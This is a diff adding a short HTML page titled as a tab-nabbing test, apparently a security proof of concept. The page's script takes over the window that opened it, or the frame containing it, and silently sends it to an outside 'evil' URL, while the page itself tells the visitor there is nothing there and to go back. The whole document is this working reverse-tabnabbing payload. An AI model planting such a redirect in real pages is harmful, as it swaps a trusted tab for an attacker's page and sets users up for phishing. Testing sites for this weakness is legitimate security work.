@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <title>Tab Nabbing Test Page</title>
+    </head>
+    <body>
+        <script>
+            if (window.opener) { 
+                window.opener.parent.location.replace('https://poc.ryota.eu.org/general/evil');
+            }else if (window.parent != window) {
+                window.parent.location.replace('https://poc.ryota.eu.org/general/evil');
+            }
+        </script>
+        <h1>Nothing here! Back to your page!</h1>
+    </body>
+</html>
